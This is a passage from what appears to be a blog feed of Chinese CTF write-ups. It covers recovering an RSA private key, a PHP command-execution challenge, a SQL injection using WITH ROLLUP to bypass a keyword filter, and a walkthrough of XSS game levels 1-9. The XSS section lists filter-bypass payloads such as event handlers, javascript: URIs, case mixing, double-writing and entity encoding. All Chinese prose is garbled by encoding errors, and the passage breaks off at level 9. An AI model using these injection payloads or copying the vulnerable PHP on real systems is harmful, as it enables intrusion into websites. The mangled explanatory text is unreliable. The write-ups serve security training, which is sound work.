class="line"><span class="keyword">while</span>(<span class="keyword">True</span>):</span><br><span class="line">    x=(Fn*i)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(x%arsa.e==<span class="number">0</span>):</span><br><span class="line">           arsa.d=x/arsa.e</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">private=open(<span class="string">'private.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">private.write(arsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>è§£å¯†å¾—åˆ°flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> flag.enc -inkey private.pem -out flag.dec</span><br></pre></td></tr></table></figure><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="WebScan"><a href="#WebScan" class="headerlink" title="WebScan"></a>WebScan</h4><p>è¿™ä¸ªé¢˜ç›®éƒ½åšäº†å¾ˆå¤šéäº†ï¼Œè¿™é‡Œæ ¹æ®é¢˜æ„å¯ä»¥å»è¯»ä¸€ä¸‹apacheçš„ç›¸å…³é…ç½®æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯è¯»å–<code>/etc/httpd/conf/httpd.conf</code>ï¼Œç›´æ¥å°±å‡ºæ¥flagäº†</p><p><img src="https://s2.ax1x.com/2019/03/31/ArM93Q.png" alt="ArM93Q.png"></p><h4 id="åˆ€å¡”"><a href="#åˆ€å¡”" class="headerlink" title="åˆ€å¡”"></a>åˆ€å¡”</h4><p>æœ‰ä¸€ä¸ªflagæ–‡ä»¶ï¼Œç»å¯¹æ˜¯æƒ³è€ƒå¯Ÿè¯»å–æ–‡ä»¶ï¼Œçœ‹åˆ°è¿˜æœ‰å‡ ä¸ªæ³¨å…¥å‚æ•°ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯SQLæ³¨å…¥è¯»æ–‡ä»¶ï¼Œä½†æ˜¯é¦–å…ˆå¾—ç»•è¿‡ï¼Œå› ä¸ºä»–å¯¹è¿‡æ»¤çš„å­—ç¬¦å›æ˜¾<code>Illegal operation!</code>ï¼Œç„¶åfuzzä¸€ä¸‹çœ‹è¿‡æ»¤äº†å“ªäº›å­—ç¬¦ï¼Œå°±çªç„¶å‡ºç°flagäº†ã€‚ã€‚è¿™æ˜¯æ¥æç¬‘çš„ï¼Ÿ(é»‘äººé—®å·)</p><p><img src="https://s2.ax1x.com/2019/03/31/ArML24.png" alt="ArML24.png"></p><p>ç„¶åå›è¿‡å¤´æ¥çœ‹çœ‹è¿™ä¸ªå‡ºé¢˜äººæƒ³å¹²å•¥ï¼Œå‘ç°è¿™ä¸ªç›®å½•ä¸‹è¿˜å­˜åœ¨ä¸€ä¸ª<code>www.zip</code>æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥ä¸‹è½½ä¸‹æ¥ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°flagã€‚ã€‚ã€‚ã€‚è¿™å‡ºé¢˜è¿˜æœ‰ä»€ä¹ˆæ„ä¹‰ï¼Ÿå†æƒ³æƒ³åº”è¯¥æ˜¯å‡ºé¢˜äººåº”è¯¥æ˜¯å¿˜è®°æŠŠflagæ–‡ä»¶å¿˜è®°åˆ é¢ã€‚ã€‚å› ä¸ºæˆ‘çœ‹äº†ä¸‹indexçš„æºç ï¼Œä»–æƒ³è€ƒå¯Ÿçš„åº”è¯¥æ˜¯å‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡ï¼Œé€šé…ç¬¦ä¹‹ç±»çš„ï¼Œå› ä¸ºä»–ä¸å…è®¸å‡ºç°å­—æ¯å¹¶ä¸”æœ‰é•¿åº¦é™åˆ¶ã€‚ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'nid'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span>(preg_match(<span class="string">"/[a-zA-Z]/"</span>,$_GET[<span class="string">'nid'</span>]))&#123;</span><br><span class="line">                  <span class="keyword">exit</span>(<span class="string">"Illegal operation!"</span>);</span><br><span class="line">               &#125;<span class="keyword">elseif</span>(strlen($_GET[nid])&gt;<span class="number">5</span>)&#123;</span><br><span class="line">                  <span class="keyword">exit</span>(<span class="string">"Illegal operation!"</span>);</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">"&lt;p class=lead&gt;"</span>;</span><br><span class="line">                  system(<span class="string">"head ./news/"</span> . $_GET[<span class="string">'nid'</span>]);</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜ç›®è´¨é‡ä¸é«˜ã€‚ã€‚ã€‚</p><h4 id="ç¾ç”·å­"><a href="#ç¾ç”·å­" class="headerlink" title="ç¾ç”·å­"></a>ç¾ç”·å­</h4><p>è¿™ä¸ªé¢˜ç›®ä¸€ä¸Šæ¥æŸ¥çœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'global.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span>(is_array($StrValue))</span><br><span class="line">    &#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrtValue)==<span class="number">1</span>)&#123;   </span><br><span class="line">        <span class="keyword">print</span> <span class="string">"holy shit!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;      </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$filter = <span class="string">"union|select|from|where|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'key1'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'key2'</span>])) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&lt;&lt;&lt;DBAPP</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;img src='image/img.jpg' /&gt;</span></span><br><span class="line"><span class="string">&lt;!--index.phps--&gt;</span></span><br><span class="line"><span class="string">DBAPP;</span></span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$query = mysql_query(<span class="string">"SELECT * FROM tb_ctf WHERE key1 = '&#123;$_POST['key1']&#125;'"</span>); </span><br><span class="line"><span class="keyword">if</span>(mysql_num_rows($query) == <span class="number">1</span>) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">'key2'</span>] == $_POST[<span class="string">'key2'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Error!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å·¦çœ‹å³çœ‹å‘ç°è¿™å°è¿‡æ»¤æœ‰ç‚¹ç†Ÿæ‚‰ï¼Œè¿™æ ¹æœ¬å°±æ˜¯å®éªŒå§ä¸Šé¢çš„åŸé¢˜å¥½å§ã€‚ã€‚ã€‚è€ƒå¯Ÿçš„æ˜¯with rollupçš„ç‰¹æ€§ï¼Œä»¥ä¸‹å›¾ä¸ºä¾‹ï¼Œæ ¹æ®passè¿™ä¸€åˆ—åˆ†ç»„ä½¿ç”¨with rollupä¹‹åä¼šäº§ç”Ÿä¸€ç»„å±æ€§ä¸ºNULLçš„å€¼ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆkey2ä½NULLçš„åŸå› </p><p><img src="https://s2.ax1x.com/2019/03/31/ArQGss.png" alt="ArQGss.png"></p><p>è¿™é‡Œé¦–å…ˆå¾—ç»•è¿‡<code>mysql_num_rows($query) == 1</code>çš„åˆ¤æ–­ï¼Œè¿™å¾ˆå®¹æ˜“ç›´æ¥ä½¿ç”¨<code>or</code>å°±è¡Œä½¿å…¶æ’æˆç«‹ï¼Œå°±ä¼šæ˜¾ç¤º<code>Error</code>è¯´æ˜æˆ‘ä»¬å·²ç»æˆåŠŸè¿›å…¥åˆ¤æ–­äº†</p><p>ä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“æ•°æ®åº“é‡Œé¢æœ‰å¤šå°‘æ•°æ®ï¼Œä¸çŸ¥é“å“ªä¸€æ¡æ˜¯NULLï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>limit offset</code>å»ä¸€æ¡æ¡æµ‹è¯•å°±å¥½ï¼Œæ ¹æ®æˆ‘çš„payloadæ¥çœ‹è¿™æ•°æ®åº“æœ¬åº”è¯¥å°±ä¸€æ¡æ•°æ®ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/31/ArQBz4.png" alt="ArQBz4.png"></p><p>å°±å†™åˆ°è¿™é‡ŒæŠŠï¼Œçº¯ç²¹å°±æ˜¯æƒ³é€ƒç¦»ä¸€ä¸‹åˆ·é«˜æ•°çš„ææƒ§2333333</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>xssæ¸¸æˆé€šå…³ç¬”è®°</title>
      <link href="/xss-game.html"/>
      <url>/xss-game.html</url>
      <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨ç»ƒä¹ xssï¼Œæ„Ÿè§‰è¿™ä¸ªæ¸¸æˆæŒºé€‚åˆæ–°æ‰‹çš„ï¼Œä»ä»£ç å±‚è§’åº¦åˆ†ææ›´åŠ æ·±åˆ»è®¤è¯†xssçš„å½¢æˆï¼Œ<a id="more"></a>å†™äº†ä¸€ä¸‹é€šå…³æ”»ç•¥ï¼Œå¹¶é™„ä¸Šäº†xssæ¼æ´ä½¿ç”¨å·¥å…·å¦‚ä½•å»fuzzã€‚ä»£ç åˆ†äº«ï¼šé“¾æ¥: <a href="https://pan.baidu.com/s/12b_E1PtgUH0b93qupJ7IvQ" target="_blank" rel="noopener">https://pan.baidu.com/s/12b_E1PtgUH0b93qupJ7IvQ</a> æå–ç : 2333</p><h3 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h3><p>è¿™ä¸ªé¢˜ç›®å‘ç°urlä¸­æœ‰ä¸€ä¸ªå‚æ•°nameå¯æ§ï¼Œç«‹åˆ»ç”¨<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>æµ‹è¯•æµ‹è¯•ä¸€ä¸‹ï¼Œå¼¹çª—æˆåŠŸï¼Œåœ¨xssä¸­æ‹¥æœ‰åŒæ ·å¼¹çª—æ•ˆæœçš„å‡½æ•°ä¸æ­¢<code>alert</code>ï¼Œè¿˜æœ‰<code>confirm</code>ä»¥åŠ<code>prompt</code></p><p><img src="https://s2.ax1x.com/2019/03/05/kXHE8A.png" alt="kXHE8A.png"></p><p>ä»ä»£ç è§’åº¦å»çœ‹ï¼Œå¯ä»¥å‘ç°å°±æ˜¯ç›´æ¥ç”¨GETæ–¹å¼è·å–å‚æ•°ç„¶åè¾“å‡ºåˆ°æµè§ˆå™¨ä¸Šé¢ï¼Œè¿™æ˜¯å…¸å‹çš„æ²¡åšè¿‡æ»¤ã€‚æ€ä¹ˆé˜²å¾¡ï¼Ÿå¯ä»¥åŠ ä¸€ä¸ªè½¬ä¹‰å‡½æ•°<code>htmlspecialchars</code>æŠŠä¸€äº›htmlæ ¼å¼çš„ä¸œè¥¿ç¼–ç å°±å¯ä»¥æœ‰æ•ˆé˜²æ­¢äº†ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/05/kXHmKP.png" alt="kXHmKP.png"></p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h3><p>åŒæ ·çš„å‘ç°urlä¸­<code>keyword</code>å‚æ•°å¯æ§ï¼Œå°è¯•æ¢æµ‹ä¸€æ³¢ï¼Œä½†æ˜¯å‘ç°è¢«è½¬ä¹‰äº†</p><p><img src="https://s2.ax1x.com/2019/03/05/kXXbE6.png" alt="kXXbE6.png"></p><p>çŒœæµ‹åº”è¯¥æ˜¯ä½¿ç”¨äº†æˆ‘ä¸Šé¢æ‰€è®²çš„å‡½æ•°ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ä»£ç </p><p><img src="https://s2.ax1x.com/2019/03/05/kXOvmq.png" alt="kXOvmq.png"></p><p>æˆ‘ä»¬å‘ç°åªæœ‰ä¸€å¤„æ˜¯ä½¿ç”¨äº†è¿™ä¸ªè½¬ä¹‰å‡½æ•°çš„ï¼Œè¿˜æœ‰ä¸€å¤„æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œåœ¨inputæ ‡ç­¾é‡Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•å»é—­åˆinputæ ‡ç­¾ï¼Œæ„é€ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å¼¹çª—æˆåŠŸ</p><p><img src="https://s2.ax1x.com/2019/03/05/kXX6H0.png" alt="kXX6H0.png"></p><h3 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h3><p>åŒæ ·å…ˆæµ‹è¯•ä¸€ä¸‹çœ‹çœ‹å“ªé‡Œæ˜¯è¾“å…¥ç‚¹ï¼Œå“ªé‡Œæ˜¯è¾“å‡ºç‚¹</p><p><img src="https://s2.ax1x.com/2019/03/05/kXjqLn.png" alt="kXjqLn.png"></p><p>ç„¶åå†ç”¨æœ€ç®€å•çš„è¯­å¥<code>&lt;script&gt;alert(123);&lt;/script&gt;</code>å°è¯•ä¸€ä¸‹ï¼Œå‘ç°å°–æ‹¬å·è¢«è½¬ä¹‰äº†ï¼Œè€Œä¸”åˆšæ‰åˆ©ç”¨çš„ç‚¹ä¹Ÿè¢«è½¬ä¹‰äº†</p><p><img src="https://s2.ax1x.com/2019/03/05/kXvpz4.png" alt="kXvpz4.png"></p><p>è§‚å¯Ÿä¸€ä¸‹æºç æ˜¯æ€æ ·è¿‡æ»¤çš„ï¼Œå¾ˆæ˜æ˜¾ä¸¤å¤„éƒ½å­˜åœ¨è¿‡æ»¤å‡½æ•°</p><p><img src="https://s2.ax1x.com/2019/03/05/kXvKQH.png" alt="kXvKQH.png"></p><p>ä½†æ˜¯è¿™ä¸ªå‡½æ•°æœ‰ä¸€ç‚¹å°±æ˜¯ï¼Œé»˜è®¤é…ç½®æ˜¯ä¸è¿‡æ»¤å•å¼•å·çš„ã€‚åªæœ‰è®¾ç½®äº†ï¼š         <code>ENT_QUOTES</code>ï¼Œæ‰å¯ä»¥è½¬ä¹‰å•å¼•å·ï¼Œæ‰€ä»¥è¿™å…³çš„valueå€¼æ˜¯åˆšå¥½ç»™äº†è¿™æ ·çš„ä¸€ä¸ªæœºä¼šå»é—­åˆã€‚</p><p><img src="https://s2.ax1x.com/2019/03/05/kXvBmn.png" alt="kXvBmn.png"></p><p>æ‰€ä»¥å¯ä»¥æ„å»ºpayloadï¼Œè¿™æ¬¡ç”±äºå¼¹çª—å†…å®¹åœ¨å°–æ‹¬å·å†…ï¼Œå¯ä»¥ä½¿ç”¨äº‹ä»¶å»å¼¹çª—ï¼Œè¿™é‡Œä»‹ç»å‡ ä¸ªå¸¸ç”¨çš„äº‹ä»¶å‡½æ•°ï¼Œæ¯”å¦‚<code>onchange, onclick, oninput</code>ç­‰ç­‰ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨<code>onchange</code>å»å®ç°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;onchange=alert`123` &apos;</span><br></pre></td></tr></table></figure><p>å¼¹çª—æˆåŠŸ</p><p><img src="https://s2.ax1x.com/2019/03/05/kXxKhT.png" alt="kXxKhT.png"></p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h3><p>åŒæ ·çš„æ–¹æ³•ï¼Œå…ˆç”¨<code>&lt;script&gt;alert(123);&lt;/script&gt;</code>å°è¯•ä¸€ä¸‹ï¼Œå‘ç°æ ‡é¢˜å¤„æ˜¯ç»è¿‡äº†è½¬ä¹‰ï¼Œä½†æ˜¯åœ¨inputæ ‡ç­¾å†…åªæ˜¯è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œå¯ä»¥æ€€ç–‘æ­¤å¤„æ˜¯å¦å‡ºç°ä½¿ç”¨é»‘åå•çš„è¿‡æ»¤ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/05/kXxa4K.png" alt="kXxa4K.png"></p><p>çœ‹ä¸€ä¸‹ä»£ç ï¼Œè¯å®ä¸€ä¸‹æ€è·¯ï¼Œå‘ç°ç¡®å®å¦‚æ­¤ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨äº‹ä»¶å»è§¦å‘å¼¹çª—ï¼Œè¿™æ ·å°±é¿å…ä½¿ç”¨äº†å°–æ‹¬å·äº†ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/05/kXxh8S.png" alt="kXxh8S.png"></p><p>è¿™é‡Œæ³¨æ„ä¸€ä¸‹ï¼Œè·Ÿä¸Šä¸€é¢˜æ˜æ˜¾ä¸åŒï¼Œè¿™é‡Œéœ€è¦ä½¿ç”¨åŒå¼•å·é—­åˆï¼Œæ„é€ å¯¹åº”çš„payloadï¼Œç„¶åä½¿ç”¨å¯¹åº”çš„æ³¨é‡Šç¬¦æŠŠåé¢çš„åŒå¼•å·ç»™æ³¨é‡Šæ‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert `123` //</span><br></pre></td></tr></table></figure><h3 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h3><p>è¿˜æ˜¯åŸæ¥çš„æµ‹è¯•æ‰‹æ®µï¼Œæ ‡é¢˜å¤„çš„è¾“å‡ºç»è¿‡è½¬ä¹‰æ²¡å•¥åˆ©ç”¨ï¼Œä½†æ˜¯åœ¨inputæ ‡ç­¾å†…ä½ ä¼šå‘ç°æµ‹è¯•çš„scriptæ ‡ç­¾è¢«å˜æˆå…¶ä»–çš„ä¸œè¥¿ï¼Œè¿™å°±å¾ˆæœ‰å¯èƒ½åˆæ˜¯ä¸€ä¸ªæ›¿æ¢ï¼Œå†ç”¨ä¸Šä¸€å…³çš„payloadå»è¯•è¯•ï¼Œä½ ä¼šå‘ç°onå˜æˆäº†o_nï¼Œç›¸å½“äºåŠ äº†ä¸€ä¸ªä¸‹åˆ’çº¿ï¼Œè¿™å°±é™åˆ¶äº†æˆ‘ä»¬ä½¿ç”¨äº‹ä»¶ä»¥åŠæ ‡ç­¾äº†ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/05/kjSz7R.png" alt="kjSz7R.png"></p><p>æŸ¥çœ‹ä¸€ä¸‹æºç ï¼Œæœç„¶æºç å¯¹<code>&lt;script</code>ä»¥åŠ<code>on</code>åšäº†è¿‡æ»¤ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/05/kjpXPP.png" alt="kjpXPP.png"></p><p>è¿™é‡Œå¯ä»¥ä½¿ç”¨<code>&lt;a&gt;</code>æ ‡ç­¾å»å®ç°å¼¹çª—çš„è°ƒç”¨ï¼Œè¿™ä¸å­˜åœ¨onæˆ–è€…scriptç­‰å…³é”®å­—ï¼Œè¿˜ä½¿ç”¨äº†<code>javascript:alert(&#39;xss&#39;)</code>å»è°ƒç”¨äº†JavaScriptçš„å‡½æ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(&apos;123&apos;)&quot;&gt;dian&lt;/a&gt; //</span><br></pre></td></tr></table></figure><p>åé¢ç‚¹å‡»å°±ä¼šäº§ç”Ÿå¼¹çª—äº†</p><p><img src="https://s2.ax1x.com/2019/03/05/kjiprD.png" alt="kjiprD.png"></p><p>å®é™…ä¸Šè¿™é¢˜è¿˜å¯ä»¥å¤§å†™ç»•è¿‡çš„ã€‚</p><h3 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h3><p>åŒæ ·çš„ï¼Œè¾“å…¥&lt;scriptå’Œonéƒ½ä¼šè¢«åŠ ä¸Šä¸‹åˆ’çº¿ï¼Œå†å°è¯•ä¸Šé¢çš„payloadä¼šå‘ç°è¿hreféƒ½è¢«æ›¿æ¢äº†ï¼Œè¿™æ ·æœ‰å¯èƒ½æ˜¯é»‘åå•å¢åŠ äº†ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/05/kjiAPI.png" alt="kjiAPI.png"></p><p>è§‚å¯Ÿä¸€ä¸‹ä»£ç å¯ä»¥å‘ç°ï¼Œå¯¹äºé»‘åå•é‡Œé¢çš„æ•°é‡ç¡®å®å¢å¤šäº†ï¼Œä½†ä¹Ÿä¸å½±å“ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤§ å°å†™å»å®ç°ç»•è¿‡ï¼Œå¯ä»¥æ„é€ ä¸‹é¢çš„ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;Script&gt;alert(&apos;123&apos;)&lt;/script&gt; //</span><br><span class="line">&quot;&gt;&lt;a Href=&quot;javascript:alert(123)&quot;&gt;dian&lt;/a&gt;//</span><br></pre></td></tr></table></figure><h3 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h3><p>è¾“å…¥çš„æµ‹è¯•ä»£ç ä¼šå‘ç°é‡Œé¢çš„å…³é”®å­—è¢«ç½®æ¢ä¸ºç©ºï¼Œè¿™å¾ˆæ˜æ˜¾å°±æ˜¯ç›´æ¥å°†æŸäº›å…³é”®å­—å˜æˆç©ºå­—ç¬¦</p><p><img src="https://s2.ax1x.com/2019/03/05/kjA0oQ.png" alt="kjA0oQ.png"></p><p>çœ‹ä¸€ä¸‹ä»£ç ï¼Œå¯ä»¥å‘ç°ç¡®å®æ˜¯æŠŠå…³é”®å­—å˜æˆäº†ç©ºå­—ç¬¦ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/05/kjAsWn.png" alt="kjAsWn.png"></p><p>è¿™é‡Œå°±ç”¨åˆ°ä¸€ä¸ªSQLæ³¨å…¥é‡Œé¢ç»å¸¸ç”¨åˆ°çš„æŠ€å·§ï¼ŒåŒå†™ç»•è¿‡ï¼Œæ„é€ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert(123);&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„å¯¹onï¼Œsrcï¼Œdataï¼ŒhrefåŒå†™ä¹Ÿå¯ä»¥å®ç°åŒæ ·çš„è€Œæ•ˆæœ</p><h3 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h3><p>åˆ†æä¸€ä¸‹ä»£ç ï¼Œå¯ä»¥å‘ç°ï¼Œè¿™æ¬¡çš„è¿‡æ»¤æ¯”å‰é¢çš„å¥½å‡ å…³éƒ½è¦ä¸¥æ ¼ï¼Œä¸ä»…åšäº†è¿‡æ»¤ï¼Œè€Œä¸”è¿˜å¯¹<code>input</code>æ ‡ç­¾é‡Œé¢çš„å†…å®¹ä½¿ç”¨<code>htmlspecialchars</code>å‡½æ•°è½¬ä¹‰äº†ã€‚ä½†æ˜¯å¯ä»¥å‘ç°è¿˜æœ‰ä¸€å¤„è°ƒç”¨çš„å­—ç¬¦ä¸²é‡Œé¢æ²¡æœ‰ä½¿ç”¨è¿™æ ·çš„å‡½æ•°å»è¿›è¡Œé˜²æŠ¤ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ä¸‹åŠŸå¤«</p><p><img src="https://s2.ax1x.com/2019/03/07/kxcjsg.png" alt="kxcjsg.png"></p><p>é‚£ä¹ˆè¯¥å¦‚ä½•åˆ©ç”¨å‘¢ï¼Ÿè¿™é‡Œåªæ˜¯è¿‡æ»¤äº†å…³é”®å­—ã€‚ä½†æ˜¯å¯ä»¥ä½¿ç”¨HTMLç¼–ç è¿›è¡Œç»•è¿‡ï¼ŒHTMLç¼–ç çš„å­˜åœ¨å°±æ˜¯è®©ä»–åœ¨ä»£ç ä¸­å’Œæ˜¾ç¤ºä¸­åˆ†å¼€ï¼Œ é¿å…é”™è¯¯ã€‚æ¨èä¸€ä¸ªç¼–ç ç½‘ç«™ï¼š<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/zifushiti.php</a></p><p>å€¼å¾—æ³¨æ„çš„æ˜¯æµè§ˆå™¨å¦‚æœè¦æŠŠHTMLç¼–ç è§£æå¹¶ä¸”æ¸²æŸ“å‰æå¿…é¡»è¦è¿™ç§ç¼–ç ä¸€å®šè¦åœ¨æ ‡ç­¾å†…æŸä¸ªå±æ€§é‡Œé¢æ‰è¡Œã€‚å¦‚ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"&amp;#104;&amp;#101;&amp;#108;&amp;#108;&amp;#111;"</span> &gt;click&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯é‡Œå¦‚æœä½ æŠŠhrefä¹Ÿç¼–ç çš„è¯ï¼Œè¿™å°±æ— æ³•æ­£å¸¸æ¸²æŸ“äº†</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a &amp;#104;&amp;#114;&amp;#101;&amp;#102;="&amp;#104;&amp;#101;&amp;#108;&amp;#108;&amp;#111;" &gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œå¯ä»¥å‚è€ƒä¸Šä¸€å…³çš„payloadï¼Œåˆ©ç”¨åè®®å»ç»•è¿‡ï¼Œåˆ©ç”¨aæ ‡ç­¾ï¼Œä¿®æ”¹é‡Œé¢çš„å±æ€§å€¼å³å¯ï¼Œåªæ˜¯scriptè¿™ä¸ªå…³é”®å­—å¾—è½¬ä¹‰ä¸€éƒ¨åˆ†æ‰è¡Œï¼Œå¦‚ä¸‹</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#x72;ipt:alert(123)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/07/kx24UA.png" alt="kx24UA.png"></p><h3 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h3><p>ä»ä»£ç è§’åº¦ä¸Šçœ‹ï¼Œåªæ˜¯å¢åŠ äº†å¯¹äºurlçš„åˆ¤æ–­ï¼Œå…¶å®å¯¹è¿™ä¸€å…³æ²¡æœ‰å¤ªå¤§å½±å“</p><p><img src="https://s2.ax1x.com/2019/03/07/kxRVa9.png" alt="kxRVa9.png"></p><p>ä¸ºä»€ä¹ˆè¿™æ 